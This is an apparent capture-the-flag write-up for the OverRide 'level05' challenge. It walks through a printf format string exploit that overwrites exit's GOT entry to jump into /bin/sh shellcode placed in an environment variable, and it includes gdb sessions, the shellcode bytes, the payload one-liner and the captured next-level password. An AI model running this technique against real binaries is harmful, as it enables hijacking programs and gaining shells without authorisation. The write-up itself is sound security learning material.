level05
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

*	We have the *level05* *executable and here is the [code](src/level05.c)
* Looking at the code, we notice:
  - User input is converted from uppercase to lowercase `input[i] ^= 0x20;`.
  - `printf(input)` is vulnerable to a **format string attack**.
  - The program calls `exit(0)` immediately afterward.
  - NX is disabled and there is no RELRO, so we can overwrite a GOT entry to redirect execution to our shellcode.

* First, let's find the GOT entry used by `exit()`:
  ```gdb
  (gdb) p exit
  $1 = 0x8048370 <exit@plt>
  (gdb) disas 0x8048370
  0x08048370 <+0>: jmp *0x80497e0
  ```

  `exit@plt` jumps to the address stored in `0x080497e0` (exit@GOT). Our goal is to overwrite this entry with the address of our shellcode.

* We need to find where our input appears among the arguments read by `printf()`. Let's try `%p`:
  ```console
  level05@OverRide:~$ ./level05
  aaaa %p %p %p %p %p %p %p %p %p %p %p
  aaaa 0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x20702520
  ```

  We find `0x61616161` (`aaaa`) at the **10th position**, so we can use `%10$hn` and `%11$hn` to write through addresses placed at the beginning of our input.

* Now let's place our shellcode in an environment variable, preceded by a NOP sled:
  ```console
  level05@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
  ```

  - `\x90` is a NOP instruction, which does nothing.
  - The NOP sled makes it easier to land on our shellcode.
  - The shellcode executes `/bin/sh` using the `execve` system call.

* We need an address inside the NOP sled. In our previous GDB run, we found:
  ```gdb
  (gdb) break fgets
  (gdb) run
  (gdb) p (char *)getenv("SHELLCODE")
        0xffffd85b: "SHELLCODE=..."
  (gdb) x/20bx (char *)getenv("SHELLCODE")
  [...]
  ```
  We chose `0xffffd869`, an address inside the NOP sled.

  **Note:** This address is specific to that execution. We must verify it again if the environment or NOP sled size changes.

* Now we need to overwrite `exit@GOT` with `0xffffd869`.

  Since `%hn` only writes 2 bytes, we split the address into two halves:

  ```text
  0x080497e0 -> 0xd869 = 55401
  0x080497e2 -> 0xffff = 65535
  ```

  `%hn` writes the number of characters already printed by `printf()`.

  Our two addresses at the beginning of the payload already account for 8 printed bytes, so:

  ```text
  First write:
  55401 - 8 = 55393

  Second write:
  65535 - 55401 = 10134
  ```

  The payload is structured as follows:

  ```text
  [exit@GOT][exit@GOT+2][padding][%10$hn][padding][%11$hn]
  ```

* Let's construct the payload 
* I made a whole [program](tools/payload) that builds the payload depending on the NOP address we give him:
  ```console
  level05@OverRide:~$ python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55393d%10$hn" + "%10134d%11$hn")' > /tmp/level05
  ```

  When `printf()` processes the two `%hn`, it overwrites the GOT entry of `exit()` with our shellcode address.

* Finally, let's execute the exploit:
  ```console
  level05@OverRide:~$ cat /tmp/level05 - | ./level05
  [...]
  whoami
  level06
  cd ../level06
  cat .pass
  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
  ```
